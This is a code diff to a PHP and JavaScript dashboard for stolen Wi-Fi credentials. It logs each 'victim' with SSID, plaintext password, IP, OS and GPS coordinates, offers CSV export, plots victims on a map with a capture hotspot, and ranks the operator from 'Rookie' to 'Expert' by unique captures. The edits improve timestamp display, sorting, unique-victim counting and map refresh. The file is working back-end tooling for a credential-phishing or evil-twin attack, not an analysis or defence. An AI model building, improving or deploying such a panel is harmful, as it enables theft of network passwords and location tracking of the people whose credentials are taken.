@@ -53,14 +53,25 @@ function parse_capture_line($line)
         $pass = '(Not Found)';
     }
 
-    $timestamp    = $timeStr !== '' ? $timeStr : 'unknown';
+    // Normalize/beautify time
+    $timestampRaw = $timeStr !== '' ? $timeStr : 'unknown';
+    $timestampPretty = $timestampRaw;
+    if ($timestampRaw !== 'unknown') {
+        $ts = strtotime($timestampRaw);
+        if ($ts !== false) {
+            // Example: "12 May 2026, 01:50 PM"
+            $timestampPretty = date('d M Y, h:i A', $ts);
+        }
+    }
+
     $passLength   = strlen($pass);
     $allLetters   = ($pass !== '' && ctype_alpha($pass));
     $allNumbers   = ($pass !== '' && ctype_digit($pass));
     $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);
 
     return [
-        'time'         => $timestamp,
+        'time_raw'     => $timestampRaw,
+        'time'         => $timestampPretty,
         'victim_id'    => $victimId !== '' ? $victimId : 'unknown',
         'ssid'         => $ssid,
         'password'     => $pass,
@@ -115,7 +126,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
             continue;
         }
         $records[] = [
-            $entry['time'],
+            $entry['time_raw'],
             $entry['victim_id'],
             $entry['ssid'],
             $entry['password'],
@@ -227,25 +238,48 @@ if (file_exists($logFile)) {
     $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 }
 
-$totalCaptures = 0;
-$ssidCount = [];
-$ipCount = [];
-$totalPasswordLength = 0;
-$weakPasswords = 0;
 $captureEntries = [];
-
 foreach ($rawLines as $idx => $rawLine) {
     $entry = parse_capture_line($rawLine);
     if ($entry === null) {
         continue;
     }
+    $entry['log_index'] = $idx; // keep original file index
+    $captureEntries[] = $entry;
+}
 
-    $totalCaptures++;
+// Sort latest first by raw timestamp if possible
+usort($captureEntries, function ($a, $b) {
+    $ta = strtotime($a['time_raw']);
+    $tb = strtotime($b['time_raw']);
+    if ($ta === false && $tb === false) return 0;
+    if ($ta === false) return 1;
+    if ($tb === false) return -1;
+    // newest first
+    return $tb <=> $ta;
+});
 
+// Re-index display idx after sorting
+foreach ($captureEntries as $i => &$entry) {
+    $entry['idx'] = $i;
+}
+unset($entry);
+
+// --- 7. Stats + unique set for rank ---
+
+$totalCaptures       = count($captureEntries); // all rows
+$ssidCount           = [];
+$ipCount             = [];
+$totalPasswordLength = 0;
+$weakPasswords       = 0;
+
+// For rank: only count unique by victim+ssid+lat+lon
+$uniqueKeySetForRank = [];
+
+foreach ($captureEntries as $entry) {
     if ($entry['ssid'] !== '') {
         $ssidCount[$entry['ssid']] = ($ssidCount[$entry['ssid']] ?? 0) + 1;
     }
-
     if ($entry['ip_main'] !== 'offline') {
         $ipCount[$entry['ip_main']] = ($ipCount[$entry['ip_main']] ?? 0) + 1;
     }
@@ -255,9 +289,8 @@ foreach ($rawLines as $idx => $rawLine) {
         $weakPasswords++;
     }
 
-    $entry['idx'] = count($captureEntries);   // display index
-    $entry['log_index'] = $idx;              // actual line index for deletion
-    $captureEntries[] = $entry;
+    $rankKey = $entry['victim_id'] . '|' . $entry['ssid'] . '|' . $entry['latitude'] . '|' . $entry['longitude'];
+    $uniqueKeySetForRank[$rankKey] = true;
 }
 
 $uniqueSSIDs     = count($ssidCount);
@@ -265,7 +298,9 @@ $uniqueIPs       = count($ipCount);
 $avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
 $weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
 
-// --- 7. Filters from query ---
+$uniqueRankCount = count($uniqueKeySetForRank);
+
+// --- 8. Filters from query ---
 $filter_ssid    = isset($_GET['ssid'])  ? trim($_GET['ssid'])  : '';
 $filter_ip      = isset($_GET['ip'])    ? trim($_GET['ip'])    : '';
 $filter_os_f    = isset($_GET['os'])    ? trim($_GET['os'])    : '';
@@ -290,10 +325,10 @@ foreach ($captureEntries as $entry) {
     $filteredEntries[] = $entry;
 }
 
-// --- 8. Map markers + hotspot + rank ---
+// --- 9. Map markers + hotspot ---
 
 $markers = [];
-$locationBuckets = []; // "lat,lon" => count
+$locationBuckets = []; // "lat,lon" => count (for filtered list)
 
 foreach ($filteredEntries as $entry) {
     $lat = $entry['latitude'];
@@ -323,23 +358,23 @@ if (!empty($locationBuckets)) {
     $hotspotLabel = $topKey . ' (' . $hotspotCount . ' captures)';
 }
 
-// Rank
-if ($totalCaptures <= 10) {
+// --- 10. Rank based on unique captures ---
+if ($uniqueRankCount <= 10) {
     $rankName  = 'Rookie';
-    $rankPct   = ($totalCaptures / 10) * 25;
-} elseif ($totalCaptures <= 30) {
+    $rankPct   = ($uniqueRankCount / 10) * 25;
+} elseif ($uniqueRankCount <= 30) {
     $rankName  = 'Intermediate';
-    $rankPct   = 25 + (($totalCaptures - 10) / 20) * 25;
-} elseif ($totalCaptures <= 100) {
+    $rankPct   = 25 + (($uniqueRankCount - 10) / 20) * 25;
+} elseif ($uniqueRankCount <= 100) {
     $rankName  = 'Advanced';
-    $rankPct   = 50 + (($totalCaptures - 30) / 70) * 25;
+    $rankPct   = 50 + (($uniqueRankCount - 30) / 70) * 25;
 } else {
     $rankName  = 'Expert';
-    $rankPct   = 75 + min(25, ($totalCaptures - 100) * 0.25);
+    $rankPct   = 75 + min(25, ($uniqueRankCount - 100) * 0.25);
 }
 $rankPct = round(min(100, max(5, $rankPct)), 1);
 
-// --- 9. Build JS data for details + map ---
+// --- 11. Build JS data for details + map ---
 $jsDetails = [];
 foreach ($filteredEntries as $entry) {
     $jsDetails[] = [
@@ -356,7 +391,7 @@ $jsMarkers       = $markers;
 $jsRankName      = $rankName;
 $jsRankPct       = $rankPct;
 $jsHotspotLabel  = $hotspotLabel;
-$jsTotalCaptures = $totalCaptures;
+$jsTotalCaptures = $uniqueRankCount; // show unique count in rank text
 
 $viewMode = 'basic';
 ?>
@@ -575,7 +610,6 @@ $viewMode = 'basic';
         window.totalCaptures  = <?php echo json_encode($jsTotalCaptures); ?>;
 
         var mapInstance = null;
-        var mapInited   = false;
 
         function toggleAutoRefresh(enabled) {
             autoRefresh = enabled;
@@ -608,7 +642,7 @@ $viewMode = 'basic';
             var rankPctEl   = document.getElementById('rank-pct');
             var rankBarEl   = document.getElementById('rank-bar');
             if (rankLabelEl && rankPctEl && rankBarEl) {
-                rankLabelEl.textContent = window.rankName + ' (' + window.totalCaptures + ' captures)';
+                rankLabelEl.textContent = window.rankName + ' (' + window.totalCaptures + ' unique captures)';
                 rankPctEl.textContent   = window.rankPct + '%';
                 rankBarEl.style.width   = window.rankPct + '%';
             }
@@ -644,55 +678,68 @@ $viewMode = 'basic';
         function showCapturesMap() {
             var box = document.getElementById('captures-box');
             if (!box) return;
+
+            // make visible before creating map
             box.style.display = 'block';
 
-            if (!mapInited) {
-                var mapDiv = document.getElementById('captures-map');
-                if (!mapDiv) return;
+            var mapDiv = document.getElementById('captures-map');
+            if (!mapDiv) return;
 
-                var markers = window.captureMarkers || [];
-                var defaultLat = 20.5937;
-                var defaultLon = 78.9629;
-                var defaultZoom = 4;
-
-                if (markers.length > 0) {
-                    defaultLat = markers[0].lat;
-                    defaultLon = markers[0].lon;
-                    defaultZoom = 5;
-                }
-
-                mapInstance = L.map('captures-map').setView([defaultLat, defaultLon], defaultZoom);
-
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    maxZoom: 18,
-                    attribution: '&copy; OpenStreetMap contributors'
-                }).addTo(mapInstance);
-
-                var bounds = [];
-                markers.forEach(function(m) {
-                    if (!m.lat || !m.lon || isNaN(m.lat) || isNaN(m.lon)) return;
-                    var marker = L.marker([m.lat, m.lon]).addTo(mapInstance);
-                    marker.bindPopup(
-                        '<b>Victim:</b> ' + m.victim_id + '<br/>' +
-                        '<b>SSID:</b> ' + m.ssid + '<br/>' +
-                        '<b>Time:</b> ' + m.time
-                    );
-                    bounds.push([m.lat, m.lon]);
-                });
-
-                if (bounds.length > 1) {
-                    mapInstance.fitBounds(bounds, { padding: [20, 20] });
-                }
-
-                mapInited = true;
-            } else {
-                mapInstance.invalidateSize();
+            // destroy old map if exists
+            if (mapInstance) {
+                mapInstance.remove();
+                mapInstance = null;
             }
+
+            var markers = window.captureMarkers || [];
+            var defaultLat = 20.5937;
+            var defaultLon = 78.9629;
+            var defaultZoom = 4;
+
+            if (markers.length > 0) {
+                defaultLat = markers[0].lat;
+                defaultLon = markers[0].lon;
+                defaultZoom = 5;
+            }
+
+            mapInstance = L.map('captures-map').setView([defaultLat, defaultLon], defaultZoom);
+
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                maxZoom: 18,
+                attribution: '&copy; OpenStreetMap contributors'
+            }).addTo(mapInstance);
+
+            var bounds = [];
+            markers.forEach(function(m) {
+                if (!m.lat || !m.lon || isNaN(m.lat) || isNaN(m.lon)) return;
+                var marker = L.marker([m.lat, m.lon]).addTo(mapInstance);
+                marker.bindPopup(
+                    '<b>Victim:</b> ' + m.victim_id + '<br/>' +
+                    '<b>SSID:</b> ' + m.ssid + '<br/>' +
+                    '<b>Time:</b> ' + m.time
+                );
+                bounds.push([m.lat, m.lon]);
+            });
+
+            if (bounds.length > 1) {
+                mapInstance.fitBounds(bounds, { padding: [20, 20] });
+            } else if (bounds.length === 1) {
+                mapInstance.setView(bounds[0], 12);
+            }
+
+            setTimeout(function() {
+                mapInstance.invalidateSize();
+            }, 100);
         }
 
         function hideCapturesMap() {
             var box = document.getElementById('captures-box');
             if (box) box.style.display = 'none';
+
+            if (mapInstance) {
+                mapInstance.remove();
+                mapInstance = null;
+            }
         }
     </script>
 </head>
